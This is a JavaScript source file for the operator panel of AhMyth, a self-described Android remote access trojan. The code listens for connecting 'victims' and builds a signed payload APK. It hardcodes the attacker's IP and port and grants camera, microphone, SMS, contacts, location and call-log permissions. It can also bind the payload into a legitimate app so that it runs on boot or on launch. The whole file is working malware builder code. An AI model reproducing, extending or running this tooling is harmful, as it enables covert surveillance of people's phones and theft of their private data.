var app = angular.module('myapp', []);
const {
    remote
} = require('electron');
var dialog = remote.dialog;
const {
    ipcRenderer
} = require('electron');
var fs = require('fs-extra')
var victimsList = remote.require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var homedir = require('node-homedir');
const {
    dirname
} = require('path');
var dir = require("path");
const {
    promisify
} = require('util');
const exec = promisify(require('child_process').exec);
var xml2js = require('xml2js');
var readdirp = require('readdirp');

var viclist = {};
var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);

app.controller("AppCtrl", ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = {
        enable: false, method: 'BOOT'
    };

    var log = document.getElementById("log");

    $appCtrl.logs = [];

    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = remote.getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    $appCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };

    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        ipcRenderer.send("SocketIO:Listen", port);
    };

    $appCtrl.StopListening = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        ipcRenderer.send("SocketIO:Stop", port);
    };

    ipcRenderer.on("SocketIO:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = true;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:Stop", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        viclist[index] = victimsList.getVictim(index);
        $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:StopError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        delete viclist[index];
        $appCtrl.$apply();
    });

    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    };

    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;
        else if (status == CONSTANTS.logStatus.WARNING)
            fontColor = CONSTANTS.logColors.ORANGE;

        $appCtrl.logs.push({
            date: new Date().toLocaleString(), msg: msg, color: fontColor
        });
        log.scrollTop = log.scrollHeight;
        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
    }

    $appCtrl.clearLogs = () => {
        if ($appCtrl.logs.length !== 0) {
            $appCtrl.logs = [];
        }
    }

    const architecture = process.arch;
    if (architecture === 'ia32') {
        delayedLog('[!] WARNING: AhMyth wWill Cease Support for All 32bit Systems Once Apktool reaches v3.0.0.', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('[★] Welcome to AhMyth Android R.A.T', CONSTANTS.logStatus.SUCCESS);
        delayedLog('————————————————————————————————————', CONSTANTS.logStatus.SUCCESS);
    }

    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog({
            properties: ['openFile'],
            title: 'Choose APK to bind',
            buttonLabel: 'Select APK',
            filters: [{
                name: 'Android APK', extensions: ['apk']
            }]
        }).then(result => {
            if (result.canceled) {
                $appCtrl.Log('[x] No APK Was Selected as a Template', CONSTANTS.logStatus.FAIL);
            } else {
                var apkName = result.filePaths[0].replace(/\\/g, "/").split('/').pop();
                $appCtrl.Log('[¡] "' + apkName + '"' + ' Was Chosen as a Template', CONSTANTS.logStatus.INFO);
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log('[x] No APK Was Selected as a Template');
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    $appCtrl.GenerateApk = async (apkFolder) => {
        if (!$appCtrl.bindApk.enable) {
            var checkBoxofCamera = document.getElementById("Permissions1");
            var checkBoxofStorage = document.getElementById("Permissions2");
            var checkBoxofMic = document.getElementById("Permissions3");
            var checkBoxofLocation = document.getElementById("Permissions4");
            var checkBoxofContacts = document.getElementById("Permissions5");
            var checkBoxofSms = document.getElementById("Permissions6");
            var checkBoxofCallsLogs = document.getElementById("Permissions7");

            const permissions = CONSTANTS.permissions;

            var selectedPermissions = [];

            if (checkBoxofCamera.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
            }
            if (checkBoxofStorage.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
            }
            if (checkBoxofMic.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
            }
            if (checkBoxofLocation.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
            }
            if (checkBoxofContacts.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
            }
            if (checkBoxofSms.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
            }
            if (checkBoxofCallsLogs.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
            }

            if (
                checkBoxofCamera.checked &&
                checkBoxofStorage.checked &&
                checkBoxofMic.checked &&
                checkBoxofLocation.checked &&
                checkBoxofContacts.checked &&
                checkBoxofSms.checked &&
                checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            if (
                !checkBoxofCamera.checked &&
                !checkBoxofStorage.checked &&
                !checkBoxofMic.checked &&
                !checkBoxofLocation.checked &&
                !checkBoxofContacts.checked &&
                !checkBoxofSms.checked &&
                !checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            try {
                delayedLog('[★] Reading the Payload Manifest File...');
                const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');

                delayedLog('[★] Parsing the Payload Manifest Data...');
                const parsedData = await new Promise((resolve, reject) => {
                    xml2js.parseString(data, (parseError, parsedData) => {
                        if (parseError) {
                            reject(parseError);
                        } else {
                            resolve(parsedData);
                        }
                    });
                });

                delayedLog('[★] Inserting the Selected Payload Permissions...');
                parsedData.manifest['uses-permission'] = [];
                parsedData.manifest['uses-feature'] = [];

                selectedPermissions.forEach(permission => {
                    if (permission === 'android.hardware.camera') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera'
                            }
                        });
                    }

                    if (permission === 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera.autofocus'
                            }
                        });
                    }

                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-permission'].push({
                            $: {
                                'android:name': permission
                            }
                        });
                    }
                });

                const builder = new xml2js.Builder();
                const updatedData = builder.buildObject(parsedData);
                await fs.promises.writeFile(
                    dir.join(CONSTANTS.ahmythApkFolderPath,
                        'AndroidManifest.xml'),
                    updatedData,
                    'utf8'
                );

            } catch (error) {
                delayedLog('[x] Error occurred while processing the Payload Manifest:',
                    CONSTANTS.logStatus.FAIL);
                writeErrorLog(error);
                delayedLog('[¡] Error written to "Error.log" on',
                    CONSTANTS.logStatus.INFO);
                delayedLog(logPath,
                    CONSTANTS.logStatus.INFO);
                return;
            }
        }

        try {
            delayedLog('[★] Emptying the Apktool Framework Directory...');
            exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
                (error, stderr, stdout) => {
                    if (error) throw error;
                });
        } catch (error) {
            // Ignore the error by doing nothing
        }

        delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
        var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath,
            CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
        exec(createApk,
            (error, stdout, stderr) => {
                if (error !== null) {
                    delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
                    writeErrorLog(error, 'Building');
                    delayedLog('[¡] Error written to "Building.log" on ', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }

                delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
                var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
                exec(signApk, (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Signing');
                        delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
                        if (err) throw err;

                        delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
                        delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
                        delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);
                        delayedLog();

                        fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                            if (err) throw err;
                        });
                    });
                });
            });
    };

    function logError(error, logType, callback) {
        delayedLog('[x] ' + error, CONSTANTS.logStatus.FAIL);
        writeErrorLog(error, logType);
        delayedLog('[¡] Error Written to "' + logType + '.log" on', CONSTANTS.logStatus.INFO);
        delayedLog(logPath, CONSTANTS.logStatus.INFO);
        if (callback) callback(error);
    }

    function modifyFile(filePath, modificationFunction, callback) {
        fs.readFile(filePath, 'utf8', (error, data) => {
            if (error) {
                logError('Reading File Failed', 'READING');
                return;
            }
            let result = modificationFunction(data);
            fs.writeFile(filePath, result, 'utf8', (error) => {
                if (error) {
                    logError('Writing File Failed', 'WRITING');
                    return;
                }
                if (callback) callback();
            });
        });
    }

    function decompileAndBindApk(filePath, bindMethod, callback) {
        var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
        delayedLog('[★] ' + 'Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");

        var decompileApk = 'java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"';

        exec(decompileApk, (error, stdout, stderr) => {
            if (error !== null) {
                logError('Decompiling Failed!', 'DECOMPILING');
                return;
            }

            if (bindMethod == 'BOOT')
                $appCtrl.bindOnBoot(apkFolder);
            else if (bindMethod == 'ACTIVITY')
                $appCtrl.bindOnActivity(apkFolder);
            if (callback) callback();
        });
    }

    $appCtrl.Build = (ip, port) => {
        if (!ip) {
            $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
            return;
        }
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        if (!$appCtrl.bindApk.enable) {
            var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
            modifyFile(ipPortFile, (data) => {
                return data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
            }, () => {
                $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
            });
        } else {
            var filePath = $appCtrl.filePath;
            if (!filePath) {
                $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
                return;
            }
            if (!filePath.includes(".apk")) {
                $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
                return;
            }

            decompileAndBindApk(filePath, $appCtrl.bindApk.method, () => {
                // your callback code here
            });
        }
    };
});

function delayedLog(msg, status) {
    let count = delayedLog.count = (delayedLog.count || 0) + 1;
    setTimeout(() => {
        $appCtrl.Log(msg, status);
    },
        count * 0o300);
};

function writeErrorLog(errorMessage, errorType) {
    // Check if the log directory exists, if not then create it
    if (!fs.existsSync(logPath)) {
        fs.mkdirSync(logPath);
    }

    // Write the error to the appropriate log file based on the error type
    switch (errorType) {
        case 'Parsing':
            fs.appendFileSync(dir.join(logPath, 'Parsing.log'), errorMessage + '\n');
            break;

        case 'Reading':
            fs.appendFileSync(dir.join(logPath, 'Reading.log'), errorMessage + '\n');
            break;

        case 'Writing':
            fs.appendFileSync(dir.join(logPath, 'Writing.log'), errorMessage + '\n');
            break;

        case 'Building':
            fs.appendFileSync(dir.join(logPath, 'Building.log'), errorMessage + '\n');
            break;

        case 'Signing':
            fs.appendFileSync(dir.join(logPath, 'Signing.log'), errorMessage + '\n');
            break;

        case 'Decompiling':
            fs.appendFileSync(dir.join(logPath, 'Decompiling.log'), errorMessage + '\n');
            break;

        case 'IP:PORT':
            fs.appendFileSync(dir.join(logPath, 'IP-PORT.log'), errorMessage + '\n');
            break;

        default:
            // If the error type is not recognized, write it to a generic error log file
            fs.appendFileSync(dir.join(logPath, 'Error.log'), errorMessage + '\n');
            break;
    }
}
